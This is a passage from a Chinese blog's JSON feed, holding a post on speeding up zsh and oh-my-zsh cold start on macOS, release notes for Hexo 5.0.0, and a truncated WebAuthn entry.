<code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]